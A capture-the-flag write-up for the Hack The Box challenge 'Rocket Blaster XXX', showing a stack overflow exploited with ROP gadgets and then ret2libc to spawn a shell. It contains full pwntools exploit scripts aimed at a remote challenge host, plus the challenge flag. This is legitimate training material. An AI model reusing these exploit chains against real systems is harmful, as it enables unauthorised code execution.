# Rocket Blaster XXX
> Write-up author: jon-brandy

## Lessons Learned:
1. ROP gadgets.
2. Manipulate return address.
3. Popping 3 gadgets.

## DESCRIPTION:

<p align="justify">Prepare for the ultimate showdown! Load your weapons, gear up for battle, and dive into the epic fray—let the fight commence!</p>

## STEPS:
1. In this challenge we're given a 64 bit binary, dynamically linked, not stripped.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/2cdc17fb-5d88-45ec-8a5e-7064831289ec)

> BINARY PROTECTIONS

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b1dcc35f-4b1c-4a7d-8c56-d1ebb6adf6d9)

2. Upon reviewing the decompiled code on ghidra, we can see the main() function only accepts 1 input then terminate the process.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/5f536ba1-7a27-4e01-8a2e-948f1ff74397)


3. Reviewing other functions, we noticed a function named `fill_ammo` which opens the flag file then print it's content.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/227056a6-41a1-48c7-aeaa-b27fe8e5fabd)


4. Seems the objective here is to return to `fill_ammo`. Noticed the `fill_ammo` function accepts 3 params, those 3 also used for a checker.
5. However since there is no canary and PIE is disabled, hence it's very easy for us to pwn the binary.

> GET RIP OFFSET --> 40

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/36e46731-9e73-47e8-b89a-fbf0904df6e2)


6. Great! Next, let's search for useful gadgets.
7. Popping 3 values to param, means we need RDI (as the 1st arg), RSI (as the 2nd arg), and RDX (as the 3rd arg).

> CHECK FOR GADGETS

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/65206058-c5e4-499d-932a-6e217ab06019)


8. Nice! The gadgets are available.
9. We can do simple ROP then, here's the crafted script.

> SCRIPT

```py
from pwn import *

exe = './rocket_blaster_xxx'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'
# context.log_level = 'DEBUG'

library = './glibc/libc.so.6'
libc = context.binary = ELF(library, checksec=False)

sh = process(exe)

rop = ROP(elf)
p = flat([
    cyclic(40),
    rop.find_gadget([
        'ret'
    ]).address,
    rop.find_gadget([
        'pop rdi',
        'ret'
    ]).address,
    0xdeadbeef,
    rop.find_gadget([
        'pop rsi',
        'ret'
    ]).address,
    0xdeadbabe,
    rop.find_gadget([
        'pop rdx',
        'ret'
    ]).address,
    0xdead1337,
    elf.sym['fill_ammo']
])

sh.sendline(p)
sh.interactive()
```

> REMOTE TEST

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/47027ad9-d23b-42e8-8da2-7cc3e26364f2)

10. As you can see, we got the flag!.

> ALTERNATE SCRIPT (much shorter using ropstar).

```py
from pwn import *

exe = './rocket_blaster_xxx'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'
# context.log_level = 'DEBUG'

library = './glibc/libc.so.6'
libc = context.binary = ELF(library, checksec=False)

# sh = process(exe)
sh = remote('94.237.54.176',59344)

rop = ROP(elf)
rop.call(rop.ret.address)
rop.fill_ammo(0xdeadbeef,0xdeadbabe,0xdead1337)

p = cyclic(40) + rop.chain()

sh.sendline(p)
sh.interactive()
```

### GAINED RCE

1. Remembering there is no canary, no PIE, and RDI is available. We can perform ret2libc here.
2. Simply leak the printf@got address to calculate the libc base.
3. Then execute another ROP to perform `system("/bin/sh")`.
4. Here's the crafted script.

> SCRIPT (RCE)

```py
from pwn import *

exe = './rocket_blaster_xxx'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'
# context.log_level = 'DEBUG'

library = './glibc/libc.so.6'
libc = context.binary = ELF(library, checksec=False)

# sh = process(exe)
sh = remote('94.237.54.176',59344)
rop = ROP(elf)

p = flat([
    cyclic(40),
    rop.find_gadget(['pop rdi', 'ret'])[0],
    elf.got['printf'],
    elf.plt['puts'],
    elf.sym['main']
])

sh.sendline(p)
sh.recvuntil(b'testing..')
sh.recvline()

leak = unpack(sh.recv(6) + b'\x00' * 2)
success(f'LIBC LEAK --> {hex(leak)}')
libc.address = leak - libc.sym['printf']
info(f'LIBC BASE --> {hex(libc.address)}')

p = flat([
    cyclic(40),
    rop.find_gadget(['ret']).address,
    rop.find_gadget(['pop rdi', 'ret']).address,
    next(libc.search(b'/bin/sh\x00')),
    libc.sym['system']
])

sh.sendline(p)
sh.interactive()
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/35662783-d365-46d8-bdd0-c2fea4f133ff)


5. Nice! We've pwned it!


## FLAG

```
HTB{b00m_b00m_b00m_3_r0ck3t5_t0_th3_m00n}
```
